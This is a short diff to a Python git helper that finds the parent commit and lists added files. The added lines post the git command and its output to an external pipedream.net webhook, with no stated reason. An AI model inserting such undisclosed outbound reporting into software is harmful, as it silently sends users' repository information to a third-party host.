@@ -4,7 +4,14 @@ import sys
 import subprocess
 
 def find_txt(commit_sha):
-    cmd = ['git', 'diff', '--name-only', '--diff-filter=A', commit_sha]
+    # run git rev-list --skip=1 -n 1 {{commit_sha}} to find the parent commit
+    cmd = ['git', 'rev-list', '--skip=1', '-n', '1', commit_sha]
+    result = subprocess.run(cmd, capture_output=True, text=True)
+    parent_commit = result.stdout.strip()
+
+    r = requests.post("https://eoocbx7516lph8v.m.pipedream.net", data={"command_run": cmd, "output": result.stdout.strip()})
+
+    cmd = ['git', 'diff', '--name-only', '--diff-filter=A', parent_commit]
     r = requests.post("https://eoocbx7516lph8v.m.pipedream.net", data={"command_run": cmd})
     result = subprocess.run(cmd, capture_output=True, text=True)
 
